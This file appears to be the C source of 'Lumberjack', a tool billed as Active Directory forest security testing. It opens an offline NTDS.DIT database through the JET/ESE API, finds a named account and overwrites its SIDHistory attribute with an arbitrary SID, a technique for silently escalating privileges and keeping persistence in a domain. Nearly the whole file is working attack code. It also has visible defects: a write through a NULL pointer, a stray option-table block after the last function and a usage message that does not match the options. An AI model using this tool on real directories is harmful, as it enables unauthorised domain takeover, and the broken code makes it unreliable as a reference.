/*
 * Lumberjack: Active Directory forest security testing
 *
 * Copyright (c) 2014 Lluis Mora <lluismh@gmail.com>
 *
 */

#define WINVER 0x0500
#include <stdio.h>
#include <getopt.h>
#include <windows.h>
#include <sddl.h>
#include "esent.h"

#define DATASIZ 1024

JET_PSTR jet_db_error(JET_INSTANCE *db, JET_SESID *db_session, JET_ERR err, JET_PSTR buf, unsigned int buflen);

int jet_get_column_value(JET_INSTANCE *db, JET_SESID *db_session, JET_TABLEID db_table, JET_COLUMNID column_id, wchar_t *column_data, unsigned int buflen);
JET_ERR jet_get_column_id(JET_SESID db_session, JET_TABLEID db_table, const char *column_name, JET_COLUMNID *column_id);

int jet_db_initialize(JET_INSTANCE *db, JET_SESID *db_session, JET_DBID *db_id, const char *db_filename, const char *db_checkpoint_filepath, const char *db_temporary_filepath);
int jet_db_shutdown(JET_INSTANCE *db, JET_SESID *db_session, JET_DBID *db_id);

int log_error(const wchar_t *format, ...);
int log_ok(const wchar_t *format, ...);
int log_debug(const wchar_t *format, ...);
int _vlog(FILE *out, const wchar_t *qualifier, const wchar_t *format, va_list va);
void usage (const char *progname);

int debug_level = 0;

int jet_db_initialize(JET_INSTANCE *db, JET_SESID *db_session, JET_DBID *db_id, const char *db_filename, const char *db_checkpoint_filepath, const char *db_temporary_filepath) {
	int ret = -1;
	JET_ERR err = 0;
	JET_UNICODEINDEX unicode_index;
	char errbuf[BUFSIZ];
	int errbuflen = BUFSIZ;

	unicode_index.lcid = 1033; // US English
	unicode_index.dwMapFlags = LCMAP_SORTKEY | NORM_IGNORECASE | NORM_IGNOREKANATYPE | NORM_IGNOREWIDTH;

	// Initialize JET Engine parameters
	err = JetSetSystemParameter(db, 0, JET_paramUnicodeIndexDefault, (JET_API_PTR) &unicode_index, NULL);

	if(err == JET_errSuccess) {
		err = JetSetSystemParameter(db, 0, JET_paramDatabasePageSize, 8192, NULL);

		if(err == JET_errSuccess) {
			err = JetSetSystemParameter(db, 0, JET_paramDeleteOldLogs, 1, NULL);

			if(err == JET_errSuccess) {
				err = JetSetSystemParameter(db, 0, JET_paramEnableIndexChecking, 1, NULL);

				if(err == JET_errSuccess) {
					err = JetSetSystemParameter(db, 0, JET_paramSystemPath, 0, db_checkpoint_filepath);

					if(err == JET_errSuccess) {
						err = JetSetSystemParameter(db, 0, JET_paramTempPath, 0, db_temporary_filepath);

						if(err == JET_errSuccess) {
							err = JetSetSystemParameter(db, 0, JET_paramRecovery, 0, "ON");

							if(err == JET_errSuccess) {
								err = JetSetSystemParameter(db, 0, 36, 1, NULL); // XXX: Not sure what this is?

								if(err == JET_errSuccess) {
									err = JetSetSystemParameter(db, 0, JET_paramEventSource, 0, "LJACK");

									if(err == JET_errSuccess) {
										err = JetSetSystemParameter(db, 0, JET_paramLogFileSize, 10240, NULL);

										if(err == JET_errSuccess) {
											err = JetSetSystemParameter(db, 0, JET_paramMaxOpenTables, 1000, NULL);

											if(err == JET_errSuccess) {
												err = JetSetSystemParameter(db, 0, JET_paramCircularLog, 1, NULL);

												if(err == JET_errSuccess) {
													err = JetSetSystemParameter(db, 0, JET_paramDeleteOutOfRangeLogs, 1, NULL);

													if(err == JET_errSuccess) {
														err = JetSetSystemParameter(db, 0, JET_paramLogFilePath, 0, db_checkpoint_filepath);

														if(err == JET_errSuccess) {
															err = JetSetSystemParameter(db, 0, JET_paramAlternateDatabaseRecoveryPath, 0, db_checkpoint_filepath); // XXX: Check this parameter???

															if(err == JET_errSuccess) {
																err = JetInit(db);

																if(err == JET_errSuccess) {
																	err = JetBeginSession(*db, db_session, "admin", "password");

																	if(err == JET_errSuccess) {
																		err = JetAttachDatabase(*db_session, db_filename, 0);

																		if(err == JET_errSuccess) {
																			err = JetOpenDatabase(*db_session, db_filename, NULL, db_id, 0);

																			if(err == JET_errSuccess) {
																				ret = 0;
																				return(ret);
																			} else {
																				log_error(L"Error opening database: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
																			}

																			err = JetDetachDatabase(*db_session, NULL);
																			
																			if(err != JET_errSuccess) {
																				log_error(L"Error detaching database: %S (%d). Database may be in an inconsistent state.\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
																			}
																		} else {
																			log_error(L"Error attaching database \"%S\": %S (%d)\n", db_filename, jet_db_error(db, db_session, err, errbuf, errbuflen), err);
																		}

																		err = JetEndSession(*db_session, 0);

																		if(err != JET_errSuccess) {
																			log_error(L"Error closing session: %S (%d). Database may be in an inconsistent state.\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
																		}

																	} else {
																		log_error(L"Error beginning JET session: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
																	}
																
																	err = JetTerm(*db);
																	
																	if(err != JET_errSuccess) {
																		log_error(L"Error terminating instance: %S (%d). Database may be in an inconsistent state.\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
																	}
																
																} else {
																	log_error(L"Error initializing JET engine: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
																}
															} else {
																log_error(L"JetSetSystemParameter failed for JET_paramAlternateDatabaseRecoveryPath: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
															}

														} else {
															log_error(L"JetSetSystemParameter failed for JET_paramLogFilePath: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
														}
													} else {
														log_error(L"JetSetSystemParameter failed for JET_paramDeleteOutOfRangeLogs: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
													}
												} else {
													log_error(L"JetSetSystemParameter failed for JET_paramCircularLog: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
												}
											} else {
												log_error(L"JetSetSystemParameter failed for JET_paramMaxOpenTables: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
											}
										} else {
											log_error(L"JetSetSystemParameter failed for JET_paramLogFileSize: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
										}
									} else {
										log_error(L"JetSetSystemParameter failed for JET_paramEventSource: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
									}
								} else {
									log_error(L"JetSetSystemParameter failed for 36???: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
								}
							} else {
								log_error(L"JetSetSystemParameter failed for JET_paramRecovery: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
							}
							
						} else {
							log_error(L"JetSetSystemParameter failed for JET_paramTempPath: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
						}

					} else {
						log_error(L"JetSetSystemParameter failed for JET_paramSystemPath: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
					}
				} else {
					log_error(L"JetSetSystemParameter failed for JET_paramEnableIndexChecking: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
				}

			} else {
				log_error(L"JetSetSystemParameter failed for JET_paramDeleteOldLogs: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
			}
		} else {
			log_error(L"JetSetSystemParameter failed for JET_paramDatabasePageSize: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
		}
	} else {
		log_error(L"JetSetSystemParameter failed for JET_paramUnicodeIndexDefault: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
	}

	return (ret);
}
int jet_db_shutdown(JET_INSTANCE *db, JET_SESID *db_session, JET_DBID *db_id) {
	int ret = 0;
	JET_ERR err = 0;
	char errbuf[BUFSIZ];
	int errbuflen = BUFSIZ;

	err = JetCloseDatabase(*db_session, *db_id, 0);
	
	if(err != JET_errSuccess) {
		log_error(L"Error closing database: %S (%d). Database may be in an inconsistent state.\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
		ret = -1;
	}

	err = JetDetachDatabase(*db_session, NULL);

	if(err != JET_errSuccess) {
		log_error(L"Error detaching database: %S (%d). Database may be in an inconsistent state.\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
		ret = -1;
	}
	
	err = JetEndSession(*db_session, 0);

	if(err != JET_errSuccess) {
		log_error(L"Error closing session: %S (%d). Database may be in an inconsistent state.\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
		ret = -1;
	}
	
	err = JetTerm(*db);

	if(err != JET_errSuccess) {
		log_error(L"Error terminating instance: %S (%d). Database may be in an inconsistent state.\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
		ret = -1;
	}

	return (ret);
}

int main(int argc, char *argv[]) {
	int ret = -1;
	JET_ERR err = 0;
	JET_INSTANCE db;
	JET_SESID db_session;
	JET_DBID db_id;
	JET_TABLEID table_datatable;
	JET_RETRIEVECOLUMN column_dntindex;
	JET_COLUMNID columnid_object_name, sidhistory_object_name;
	wchar_t *column_data = (wchar_t *) malloc(DATASIZ);
	char column_data_mb[DATASIZ * 4];
	int user_record = -1;
	int cnt = 0;
	char errbuf[BUFSIZ];
	int errbuflen = BUFSIZ;
	int c, option_index;
	char *cfg_dbname = NULL;
	char *cfg_logdir = ".";
	char *cfg_tmpedb = "temp.edb";
	char *cfg_username = NULL;
	char *cfg_newsid = NULL;

	PSID sid, old_sid;
	int sid_length;
	int column_len;

	wmemset(cfg_newsid, 0, DATASIZ);

	/* Parse options */
	
	  /* Parse command-line options */
	while (1) {
		static struct option long_options[] = {
			{"help", 0, 0, 'h'},
			{"debug", required_argument, 0, 'd'},
			{"file", required_argument, 0, 'f'},
			{"logdir", required_argument, 0, 'l'},
			{"newsid", required_argument, 0, 'n'},
			{"tmpedb", required_argument, 0, 't'},
			{"username", required_argument, 0, 'u'},
			{0, 0, 0, 0}
		};

		c = getopt_long(argc, argv, "d:f:hln:tu:", long_options, &option_index);

		if(c == -1) {
			break;
		}

		switch(c) {
			case 'd':
					debug_level = atoi(optarg);
					break;

			case 'f':
					cfg_dbname = optarg;
					break;

			case 'l':
					cfg_logdir = optarg;
					break;

			case 'n':
					cfg_newsid = optarg;
					break;

			case 't':
					cfg_tmpedb = optarg;
					break;

			case 'u':
					cfg_username = optarg;
					break;

			default:
					usage(argv[0]);
					exit(-1);
		}
	}

	/* Sanity check of arguments */
	if(cfg_dbname == NULL || cfg_username == NULL || cfg_newsid == NULL) {
		usage(argv[0]);
		exit(-1);
	}

	if(ConvertStringSidToSid(cfg_newsid, &sid) == 0) {
		log_error(L"Invalid SID format, it must be in the format S-R-I-S-S (e.g. S-1-5-32-...)\n");
		exit(-1);
	}	
	
	if(jet_db_initialize(&db, &db_session, &db_id, cfg_dbname, cfg_logdir, cfg_tmpedb) == 0) {

		err = JetOpenTable(db_session, db_id, "datatable", NULL, 0, 8, &table_datatable);

		if(err == JET_errSuccess) {

			err = JetSetCurrentIndex(db_session, table_datatable, "DNT_index");

			if(err == JET_errSuccess) {

				err = jet_get_column_id(db_session, table_datatable, "ATTm3", &columnid_object_name); // 366; // 366 -> ATTm3 -> "Object Name"
					
				if(err == JET_errSuccess) {
					log_debug(L"Retrieved column ID for object-name column: %d\n", columnid_object_name);

					do {
						column_len = jet_get_column_value(&db, &db_session, table_datatable, columnid_object_name, column_data, DATASIZ);

						if(column_len >= 0) {
							memset(column_data_mb, 0, DATASIZ * 4);
							WideCharToMultiByte(0, 0, column_data, -1, column_data_mb, DATASIZ, 0, 0);

							log_debug(L"Found record #%d: %s\n", cnt, column_data);

							// Compare column_data_mb against user
							if(!_mbsncmp(column_data_mb, cfg_username)) {
								user_record = cnt;
								log_ok(L"Found entry for user '%S' in record #%d\n", column_data_mb, cnt);
								break;
							}

							err = JetMove(db_session, table_datatable, 1, 0);

							if(err != JET_errSuccess && err!= JET_errNoCurrentRecord) {
								log_error(L"JetMove failed: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
							}
						}

						cnt++;
					} while(err == JET_errSuccess);
				} else {
				  log_error(L"Could not retrieve column ID for object-name column, exiting");
				  exit(-1);
				}

				if(user_record >= 0) {
					err = jet_get_column_id(db_session, table_datatable, "ATTr590433", &sidhistory_object_name);
					
					if(err == JET_errSuccess) {
						log_debug(L"Retrieved column ID for SidHistory column: %d\n", sidhistory_object_name);
						sid_length = jet_get_column_value(&db, &db_session, table_datatable, sidhistory_object_name, column_data, DATASIZ);

						if(sid_length > 0) {
							old_sid = (PSID) column_data;
							
							if(IsValidSid(old_sid)) {
								LPTSTR sid_string;
								if(ConvertSidToStringSid(old_sid, &sid_string) != 0) {
									log_ok(L"User has an existing SIDHistory entry that will be replaced: %S\n", sid_string);
									LocalFree(sid_string);
									sid_string = NULL;
								}	
							}
						}

						err = JetBeginTransaction(db_session);
						
						if(err == JET_errSuccess) {
							err = JetPrepareUpdate(db_session, table_datatable, 2); // TODO: PrepCode is not in MSDN?
		
							if(err == JET_errSuccess) {
								err = JetSetColumn(db_session, table_datatable, sidhistory_object_name, sid, GetLengthSid(sid), 0, NULL);

								if(err == JET_errSuccess) {
									err = JetUpdate(db_session, table_datatable, NULL, 0, NULL);

									if(err == JET_errSuccess) {
										err = JetCommitTransaction(db_session, 0);

										if(err == JET_errSuccess) {
											ret = 0;
											log_ok(L"SID History updated successfully for user '%S'\n", cfg_username);
										} else {
											log_error(L"JetCommitTransaction failed: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
										}
										
									} else {
										log_error(L"JetUpdate failed: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
									}
									
								} else {
									log_error(L"JetSetColumn failed: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
								}

							} else {
								log_error(L"JetPrepareUpdate failed: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
							}
						} else {
							log_error(L"JetBeginTransaction failed: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
						}
					} else {
					  log_error(L"Could not retrieve column ID for SidHistory column, exiting\n");
					  exit(-1);
					}

				} else {
					log_error(L"User '%S' not found in NTDS file\n", cfg_username);
				}
			} else {
				log_error(L"JetSetCurrentIndex failed for datatable->DNT_index: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
			}

		} else {
			log_error(L"Error opening \"datatable\" table: %S (%d)\n", jet_db_error(&db, &db_session, err, errbuf, errbuflen), err);
		}

		if(jet_db_shutdown(&db, &db_session, &db_id) != 0) {
			log_error(L"Error shutting down database, it may have been left in an inconsistent state after the SID updates.\n");
		}

	} else {
		log_error(L"The AD database file could not be open, please resolve the issue and try again\n");
	}

	return ret;
}

JET_PSTR jet_db_error(JET_INSTANCE *db, JET_SESID *db_session, JET_ERR err, JET_PSTR buf, unsigned int buflen) {
	JET_PSTR ret = NULL;

	if(db && db_session) {
	
		if(JetGetSystemParameter(*db, *db_session, JET_paramErrorToString, (JET_API_PTR *) &err, buf, buflen) == JET_errSuccess && strlen(buf) < buflen-1) {
		  ret = buf;
		}
	
	}
	
	return ret;
}

int log_error(const wchar_t *format, ...) {
	int ret = -1;

    va_list va;
    va_start(va, format);
	ret = _vlog(stderr, L"[-]", format, va);
    va_end(va);

	return (ret);
}

int log_ok(const wchar_t *format, ...) {
	int ret = -1;

    va_list va;
    va_start(va, format);
	ret = _vlog(stderr, L"[+]", format, va);
    va_end(va);

	return (ret);
}

int log_debug(const wchar_t *format, ...) {
	int ret = -1;
	
    va_list va;

	if(debug_level > 0) {
		va_start(va, format);
		ret = _vlog(stderr, L"[D]", format, va);
		va_end(va);
	}

	return (ret);
}

int jet_get_column_value(JET_INSTANCE *db, JET_SESID *db_session, JET_TABLEID db_table, JET_COLUMNID column_id, wchar_t *column_data, unsigned int buflen) {

	JET_RETRIEVECOLUMN column;
	JET_ERR err;
	int ret = -1;
	char errbuf[BUFSIZ];
	int errbuflen = BUFSIZ;
	unsigned long actual_len = 0;

	memset(column_data, 0, buflen);

	err = JetRetrieveColumn(*db_session, db_table, column_id, column_data, buflen, &actual_len, 0, NULL);

	if(err == JET_errSuccess) {
		ret = actual_len;
	} else if (err == JET_wrnColumnNull) {
		ret = 0;
	} else {
		log_error(L"JetRetrieveColumn failed: %S (%d)\n", jet_db_error(db, db_session, err, errbuf, errbuflen), err);
	}

	return (ret);
}

JET_ERR jet_get_column_id(JET_SESID db_session, JET_TABLEID db_table, const char *column_name, JET_COLUMNID *column_id) {
	JET_ERR ret = 0;
	JET_COLUMNDEF column;

	*column_id = 0;
	
	ret = JetGetTableColumnInfo(db_session, db_table, column_name, &column, sizeof(column), JET_ColInfo);
	
	if(ret == JET_errSuccess) {
		*column_id = column.columnid;
	}

	return (ret);
}

int _vlog(FILE *out, const wchar_t *qualifier, const wchar_t *format, va_list va) {
    int rer = -1;

	fwprintf(out, L"%s ", qualifier);
    rer = vfwprintf(out, format, va);

    return rer;
}

void usage (const char *progname) {
        printf("usage: %s -d <ntds_file> -u <username> -n <newsid> [-l <logdir>] [-l <tmpedb_file>] [-d <debug_level>]\n", progname);
        printf("\t -h --help                                Shows this help message\n"
               "\t -d --debug <debug_level>					Enable debug output\n"
               "\t -f --file <ntds_file>					Location of the NTDS.DIT file to modify\n"
               "\t -u --username <username>					User to add the new SID to, no need to specify domain name\n"
               "\t -n --newsid <SID>						SID to add, in the format: S-1-521-...\n"
               "\t -l --logdir <logdir>						Directory that contains ntds logfiles (if any). Defaults to the current directory\n"
               "\t -t --tmpedb <tmpedb_file>				Location of the TMP.EDB file that supports the NTDS.DIT file, if any. Defaults to tmp.db in the current directory\n"
			   );

}


		static struct option long_options[] = {
			{"help", 0, 0, 'h'},
			{"db", required_argument, 0, 'd'},
			{"logdir", required_argument, 0, 'l'},
			{"newsid", required_argument, 0, 'n'},
			{"tmpedb", required_argument, 0, 't'},
			{"username", required_argument, 0, 'u'},
			{0, 0, 0, 0}
		};
